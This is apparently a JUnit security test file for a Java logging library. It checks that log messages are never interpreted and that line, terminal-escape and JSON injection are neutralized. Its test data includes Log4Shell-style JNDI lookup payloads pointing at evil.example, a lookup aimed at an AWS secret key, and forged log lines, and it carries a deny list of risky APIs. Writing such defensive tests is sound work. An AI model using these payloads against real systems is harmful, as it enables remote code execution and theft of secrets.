package io.hydrangea.log;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * The classes of defect that made logging libraries a target: text interpreted as something else (Log4Shell's
 * {@code ${jndi:...}} lookups), forged lines through control characters, and configuration that loads code or reaches the network.
 */
class SecurityTest {

    private MemoryAppender mem;

    @BeforeEach
    void setUp() {
        mem = Appender.memory();
        Log.configure().async(false).level(Level.TRACE).stage(mem).apply();
    }

    @AfterEach
    void tearDown() {
        Log.reset();
    }

    @Test
    void messagesAndArgumentsAreNeverInterpreted() {
        Logger log = Logger.get("s.lookup");
        String[] payloads = {
                "${jndi:ldap://evil.example/a}",
                "${${lower:j}ndi:rmi://evil.example/b}",
                "${env:AWS_SECRET_ACCESS_KEY}",
                "${sys:user.home}",
                "%s %n %d %x",
                "{0,number,#.##}",
                "$${ctx:x}",
                "\\{}{}"
        };
        for (String p : payloads) {
            log.info(p);
            log.info("{}", p);
            log.info(p, "arg");
            log.at(Level.INFO).kv("k", p).log(p);
        }
        for (LogEvent e : mem.events()) {
            String m = e.message();
            assertTrue(m.contains("${") || m.contains("%") || m.contains("{0") || m.contains("{}"), m);
        }
        assertTrue(mem.text().contains("${jndi:ldap://evil.example/a}"));
        assertTrue(mem.text().contains("k=${env:AWS_SECRET_ACCESS_KEY}"));
    }

    @Test
    void lineInjectionIsNeutralizedInEveryTextField() {
        Logger log = Logger.get("s.inject");
        String crlf = "ok\r\n1970-01-01 00:00:00.000 ERROR [main] admin - FORGED";
        LogContext.put("ctx", crlf);
        log.at(Level.INFO).kv(crlf, crlf).log("user said {}", crlf);
        log.error("boom", new RuntimeException(crlf));
        LogContext.clear();
        List<String> lines = mem.lines();
        assertEquals(1, lines.get(0).lines().count(), lines.get(0));
        assertFalse(lines.get(0).contains("\r"));
        assertTrue(lines.get(0).contains("user said ok\\r\\n1970"), lines.get(0));
        assertTrue(lines.get(0).contains("ctx=\"ok\\\\r\\\\n1970"), lines.get(0));   // quoted value: the escape's backslash is itself escaped
        String withTrace = lines.get(1);
        assertTrue(withTrace.lines().allMatch(l -> !l.startsWith("1970")), "no line of the stack trace looks like a new event");
        assertTrue(withTrace.contains("java.lang.RuntimeException: ok\\r\\n1970"), withTrace);
    }

    @Test
    void terminalEscapesAreNeutralized() {
        Logger.get("s.ansi").info("\u001b[2J\u001b[H\u001b]0;pwned\u0007 done");
        String line = mem.lines().get(0);
        assertFalse(line.contains("\u001b"));
        assertFalse(line.contains("\u0007"));
        assertTrue(line.contains("\\u001b[2J\\u001b[H\\u001b]0;pwned\\u0007 done"), line);
    }

    @Test
    void hugeAndHostileInputsDoNotBreakTheChain() {
        Logger log = Logger.get("s.huge");
        String big = "x".repeat(5_000_000);
        log.info(big);
        log.info("{}", (Object) null);
        log.info((String) null);
        log.info("{} {}", (Object[]) null);
        log.info("{}", new Object[] {new Object[] {new int[] {1}}});
        Object[] self = new Object[1];
        self[0] = self;
        log.info("{}", (Object) self);
        assertEquals(6, mem.size());
        assertEquals(big.length(), mem.events().get(0).message().length());
        assertEquals("null", mem.events().get(1).message());
        assertEquals("", mem.events().get(2).message());
        assertEquals("{} {}", mem.events().get(3).message());
        assertEquals("[[1]]", mem.events().get(4).message());          // the outer array is the varargs array
        assertEquals("[[...]]", mem.events().get(5).message());
    }

    @Test
    void jsonOutputCannotBeBrokenOutOf() {
        MemoryAppender json = Appender.memory(LogFormat.json());
        Log.configure().async(false).level(Level.TRACE).stage(json).apply();
        Logger.get("s.json").at(Level.INFO).kv("k\"}", "v\"},{\"fake\":1").log("\"}\n{\"level\":\"ERROR\"");
        String line = json.lines().get(0);
        assertEquals(1, line.lines().count());
        assertTrue(line.contains("\",\"level\":\"INFO\",\"logger\":"), line);
        assertEquals(1, line.split("\"level\":\"", -1).length - 1, "one level key: " + line);
        assertTrue(line.contains("\"msg\":\"\\\"}\\n{\\\"level\\\":\\\"ERROR\\\"\""), line);
        assertTrue(line.contains("\"k\\\"}\":\"v\\\"},{\\\"fake\\\":1\""), line);
    }

    @Test
    void theLibraryDependsOnTheJdkOnlyAndLoadsNoClassesByName() throws Exception {
        java.nio.file.Path root = java.nio.file.Path.of("src/main/java/io/hydrangea/log");
        try (var files = java.nio.file.Files.walk(root)) {
            for (var f : files.filter(p -> p.toString().endsWith(".java")).toList()) {
                String src = java.nio.file.Files.readString(f);
                assertFalse(src.contains("Class.forName"), f.toString());
                assertFalse(src.contains("java.net."), f.toString());
                assertFalse(src.contains("ObjectInputStream"), f.toString());
                assertFalse(src.contains("javax.naming"), f.toString());
                assertFalse(src.contains("java.lang.reflect"), f.toString());
                assertFalse(src.contains("ScriptEngine"), f.toString());
                for (String line : src.lines().toList()) {
                    if (line.startsWith("import ")) {
                        assertTrue(line.startsWith("import java.") || line.startsWith("import io.hydrangea.log."), f + ": " + line);
                    }
                }
            }
        }
    }
}
